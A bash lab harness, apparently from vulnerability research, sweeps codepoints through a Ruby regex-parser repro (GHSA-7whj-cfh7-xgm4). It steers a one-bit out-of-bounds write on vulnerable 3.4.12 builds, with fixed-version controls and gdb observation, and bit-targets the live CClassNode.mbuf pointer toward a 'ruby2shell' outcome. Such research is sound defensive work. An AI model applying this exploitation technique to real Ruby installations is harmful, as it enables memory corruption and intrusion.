#!/usr/bin/env bash
# Sweep the GHSA-7whj-cfh7-xgm4 codepoint steering probe on plain and ASan
# 3.4.12, with fixed 3.4.13 and valid-codepoint controls, then observe the
# one-bit write with gdb on the unsanitized build. A second sweep targets
# the live CClassNode.mbuf pointer with small codepoints. All work stays
# in the lab; evidence is gitignored under lab/build/evidence/tos-steer/.
set -u
ROOT=$(cd "$(dirname "$0")/../.." && pwd)
cd "$ROOT" || exit 2
EVID=lab/build/evidence/tos-steer
mkdir -p "$EVID"
RB=lab/repro/ruby2shell-tos-steer.rb
P12=lab/build/plain/ruby-3.4.12-plain/bin/ruby
P13=lab/build/plain/ruby-3.4.13-plain/bin/ruby
A12=lab/build/ruby-3.4.12-asan/bin/ruby
A13=lab/build/ruby-3.4.13-asan/bin/ruby
: >"$EVID/summary.txt"

run() { # label binary codepoint run-number
  local label=$1 bin=$2 code=$3 num=$4 out rc fault index
  out="$EVID/$label-$code-$num.out"
  if [[ $label == asan* || $label == safe-asan* ]]; then
    UBSAN_OPTIONS=halt_on_error=0:print_stacktrace=0 timeout 30 "$bin" "$RB" "$code" >"$out" 2>&1
  else
    timeout 30 "$bin" "$RB" "$code" >"$out" 2>&1
  fi
  rc=$?
  fault=$(grep -m1 -oE 'Segmentation fault at 0x[0-9a-f]+' "$out" | awk '{print $NF}')
  index=$(grep -m1 -oE 'index [0-9]+ out of bounds' "$out" | awk '{print $2}')
  printf '%-12s %-8s run=%s rc=%-3s fault=%-18s index=%s\n' \
    "$label" "$code" "$num" "$rc" "${fault:--}" "${index:--}" | tee -a "$EVID/summary.txt"
}

for code in 110000 110001 110041 200000 400000 7fffffff; do
  for num in 1 2 3; do run plain12 "$P12" "$code" "$num"; done
done
for code in 110001 400000 7fffffff; do run asan12 "$A12" "$code" 1; done
for code in 110001 7fffffff; do
  run plain13 "$P13" "$code" 1
  run asan13 "$A13" "$code" 1
done
run safe-plain12 "$P12" 41 1
run safe-asan12 "$A12" 41 1

for code in 110001 110041 110080; do
  timeout 90 gdb -q -batch -ex "set environment TOS_CODE $code" \
    -x lab/repro/ruby2shell-tos-steer.gdb --args "$P12" >"$EVID/gdb-$code.out" 2>&1
  echo "gdb $code rc=$? see $EVID/gdb-$code.out"
done

# Small V=0x100..0x11f targets the low word of the live CClassNode.mbuf
# pointer (bs+32); V=0x120..0x13f targets its high word (bs+36). The
# parser consumes mbuf in is_onechar_cclass (regparse.c:6200).
: >"$EVID/small-v-sweep.txt"
for base in 100 120; do
  for b in $(seq 0 31); do
    v=$((0x$base + b))
    code=$(printf '%x' "$v")
    out="$EVID/small-v-$code.out"
    timeout 30 "$P12" "$RB" "$code" >"$out" 2>&1
    rc=$?
    fault=$(grep -m1 -oE 'Segmentation fault at 0x[0-9a-f]+' "$out" | awk '{print $NF}')
    printf 'V=0x%-6s off=%-3d bit=%-2d rc=%-3s fault=%s\n' \
      "$code" "$(( ((0x$base + b) >> 5) * 4 ))" "$b" "$rc" "${fault:--}" \
      | tee -a "$EVID/small-v-sweep.txt"
  done
done
run smallv12 "$P12" 100 1
run smallv13 "$P13" 100 1
run smallv13 "$P13" 120 1
run smallv12 "$P12" 10000 1
run safe-smallv12 "$P12" 41 1

for code in 100 10000; do
  timeout 90 gdb -q -batch -ex "set environment TOS_CODE $code" \
    -x lab/repro/ruby2shell-tos-steer.gdb --args "$P12" >"$EVID/gdb-small-$code.out" 2>&1
  echo "gdb small $code rc=$? see $EVID/gdb-small-$code.out"
done
echo "summary: $EVID/summary.txt"
